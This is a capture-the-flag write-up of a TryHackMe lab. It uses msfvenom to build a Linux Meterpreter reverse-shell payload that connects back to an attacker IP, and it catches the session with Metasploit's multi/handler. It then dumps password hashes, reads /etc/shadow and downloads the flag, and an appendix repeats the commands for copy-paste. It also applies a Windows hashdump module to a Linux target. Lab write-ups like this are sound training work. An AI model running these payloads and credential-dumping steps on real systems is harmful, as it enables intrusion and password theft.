# tryhackme — msvenom / reverse shell writeup

**Room:** msvenom / reverse shell (TryHackMe)  
**Author:** David Martinez  
**Date:** 2025-10-30  
**Target:** Lab VM (Linux)  
**Attacker:** Kali / Attack VM (10.201.123.188)

---

## Objective
- Use `msvenom` to generate a Linux reverse Meterpreter payload, deploy it to the target VM, obtain a Meterpreter session, escalate if necessary, and retrieve the password flag.

---

## Tools
- `msfvenom` (Metasploit Framework)
- `msfconsole`
- `netcat` / `nc` (for quick TCP checks)
- `ss` / `lsof` (port/process troubleshooting)
- `docker` (was present on the attacker box and caused a bind conflict)
- `hashdump` (Meterpreter / post module)
- Basic Linux CLI: `scp`, `chmod`, `file`, `strings`, `tcpdump`

---

## Recon / Preparation
1. Confirm attacker interface and IP:
```bash
ip addr show
# confirm 10.201.123.188 exists on an interface (e.g., tun0, eth0)
```

2. Generate the payload with `msfvenom` (example):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.123.188 LPORT=7777 -f elf -o reverse_shell.elf
```

3. Make it executable and transfer to the target (example using `scp`):
```bash
chmod +x reverse_shell.elf
scp reverse_shell.elf user@<target-ip>:/tmp/
```

---

## Problem encountered (handler bind failure)
When starting the Metasploit handler, the attempt to bind to `10.201.123.188:7777` failed with:
```
Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:7777)
```
Inspection showed port 7777 was already bound by Docker’s proxy:
```bash
sudo ss -ltnp | grep :7777
# output showed: users:(("docker-proxy",pid=1694,fd=4))
```

### Fixes tried
**Option A — Free the port used by Docker**
```bash
# find container publishing 7777
sudo docker ps --format '{{.ID}}	{{.Names}}	{{.Ports}}' | grep 7777

# stop/remove the container
sudo docker stop <CONTAINER_ID>
sudo docker rm <CONTAINER_ID>
```
After stopping/removing the container, the port was freed and the handler could bind successfully.

**Option B — Use a different port**
If freeing the port is undesirable, re-generate the payload and use a different LPORT (e.g., `4444`) in both the payload and the handler:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.123.188 LPORT=4444 -f elf -o reverse_shell_4444.elf
# in msfconsole set LPORT 4444 before running handler
```

Also note the `sudo: unable to resolve host ip-10-201-123-188` warning — a quick fix is to ensure the hostname is present in `/etc/hosts`:
```bash
echo "127.0.1.1 ip-10-201-123-188" | sudo tee -a /etc/hosts
```

After freeing the port or switching ports, the handler should bind cleanly and catch the reverse shell when the payload is executed on the target.

---

## Exploitation / Getting a session
1. Start the Metasploit handler:
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.201.123.188
set LPORT 7777
set ExitOnSession false
exploit -j -z
```

2. Execute the payload on the target:
```bash
chmod +x /tmp/reverse_shell.elf
/tmp/reverse_shell.elf
```

3. Observe incoming connection and session creation in `msfconsole`:
```bash
sessions -l
sessions -i <id>
```

---

## Post-exploitation — dumping hashes & getting the flag
With a Meterpreter session established:

1. Confirm privileges and host:
```meterpreter
meterpreter > sysinfo
meterpreter > getuid
```

2. If meterpreter has sufficient privileges (SYSTEM/root), run:
```meterpreter
meterpreter > hashdump
```
or use the post module:
```bash
# from msfconsole
use post/windows/gather/hashdump
set SESSION <session-id>
run
```
> Note: On Linux targets there is no SAM — to retrieve password hashes you need root access to `/etc/shadow`:
```meterpreter
meterpreter > shell
# in shell
sudo cat /etc/shadow
# or download:
meterpreter > download /etc/shadow /tmp/shadow-copy
```

3. Retrieve the flag (the lab’s password flag):
- Locate the flag file (example common locations: `/root/flag.txt`, `/home/username/flag.txt`).
```bash
meterpreter > shell
# then on target shell
cat /root/password_flag.txt
# or
meterpreter > download /root/password_flag.txt
```

**Flag (redacted in public repo):**
```
# DO NOT PUBLISH REAL FLAG HERE — keep it private in CTF writeups
```

---

## Evidence / Artifacts (examples to include in repo)
- `file reverse_shell.elf` output (binary type & arch)
- `strings reverse_shell.elf | grep -i meterpreter` (showing embedded identifiers)
- `sudo ss -ltnp | grep :7777` output showing docker-proxy PID
- `msfconsole` session log: `sessions -l` output and `hashdump` output (redact sensitive data)
- Packet capture snippet showing target → attacker TCP connect (from `tcpdump`)

---

## Lessons learned / Notes
- Always verify the LHOST is present on an attacker interface (`ip addr show`) — otherwise `bind()` may behave unexpectedly.  
- If `Rex::BindFailed` occurs, check for any process (including Docker) binding the port and either stop it or choose another port.  
- For Windows hash dumping, `hashdump` / `mimikatz` require SYSTEM privileges. For Linux, you need root access to `/etc/shadow`.  
- Keep your payload and handler LHOST/LPORT consistent. If in doubt re-generate the payload.  
- Always redact real flags and sensitive data before posting to a public repo.

---

## References
- Metasploit Framework: `msfconsole`, `msfvenom`, `exploit/multi/handler`  
- Meterpreter commands: `hashdump`, `migrate`, `sysinfo`, `getuid`  
- TryHackMe room materials (do not copy proprietary content; link only when allowed by room rules)

---

## Appendix — Useful commands (copy/paste)
```bash
# Generate payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.201.123.188 LPORT=7777 -f elf -o reverse_shell.elf

# Check port usage
sudo ss -ltnp | grep :7777
sudo lsof -i :7777

# Kill container binding a port
sudo docker ps --format '{{.ID}}	{{.Names}}	{{.Ports}}' | grep 7777
sudo docker stop <ID> && sudo docker rm <ID>

# Start handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.201.123.188
set LPORT 7777
set ExitOnSession false
exploit -j -z

# Meterpreter basics
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > shell
meterpreter > download /root/password_flag.txt
```
